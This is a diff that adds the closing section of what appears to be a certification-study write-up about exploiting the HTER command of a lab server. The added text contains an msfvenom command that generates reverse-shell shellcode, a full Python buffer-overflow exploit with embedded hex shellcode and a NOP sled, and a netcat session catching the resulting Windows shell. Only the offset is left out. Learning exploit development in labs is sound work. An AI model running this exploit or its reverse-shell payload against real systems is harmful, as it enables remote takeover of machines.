@@ -117,6 +117,65 @@ Next we just have to generate some shellcode and add our NOPs and we should be g
 
 ![](/assets/images/CTP/INT3.JPG)
 
+Everything looks good!
+
+Let's generate some shellcode with the following command (notice we used the `-f hex` option): `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.206 lport=443 -f hex EXITFUNC=thread -b "\x00"`
+
+All we need to do now is add some NOPs to prepend our shellcode, they will simply be input into our script as `90` since we're dealing in hex. 
+
+### Final Exploit Code Minus Offset ;)
+
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+shellcode = ("ddc5bafbebb770d97424f45e2bc9b15283eefc31561303adf85585ad171b664de87ce"
+"ea8d9bc94b94a0ddeef66e6b21bfc8a1a2cb5217d034619bd02c46092e4f5aae7e532d60ab7eb9cb92"
+"79fe901ccd3fc0131a3ff20e4bf59e30713d2aa1f70df659442ab777c9b54db4113a72586945850fee"
+"6e563c59531e1dd3eb15139be1607caccd34394d0e280afed6f277f642b0c5b2cef2dfa885e511c733"
+"ef7579e2b8a3af798a7c407b7b0b735186b5f76d1b59879c8023684f3721f43a7223762c8a8c78b1d7"
+"e9723ce3f4784bed78d0be0c8aec18963558275db549c1e1e56216497b04b8afe6be4335be795bc718"
+"29637767358b0f3670d304ed5984f647146dde38101febbd64630b2b27a6b6ca086ed57605dce56691"
+"06a7d79ec73392da025979b069c5975d1733011a4bf8367a99575871840c0b89504c4c1cbb42b1848d"
+"4c988a57d545904e067b44b1de43c34daf43531a6b2a64bb756c8f8b872")
+
+buffer = 'A' * <offset number>
+buffer += 'BB115062'
+buffer += '90' * 16 
+buffer += shellcode
+buffer += 'C' * (3000 - len(buffer))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("HTER " + buffer)
+print s.recv(1024)
+s.close()
+```
+
+And we catch our reverse shell!
+```terminal_session
+astrid:~/ # nc -lvp 443                                                                                           
+listening on [any] 443 ...
+192.168.1.201: inverse host lookup failed: Unknown host
+connect to [192.168.1.206] from (UNKNOWN) [192.168.1.201] 49314
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+ ' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\IEUser\Desktop>
+```
+
+## Conclusion
+
+All in all, a pretty easy exploit compared to the things we've been doing but little curveballs like the hex characters can really stop progress for a while. It took me a while to figure out what was going on as I had never encountered this before and my go-to's like Mona weren't helping. Thanks for reading!
 
 ## Resources
 
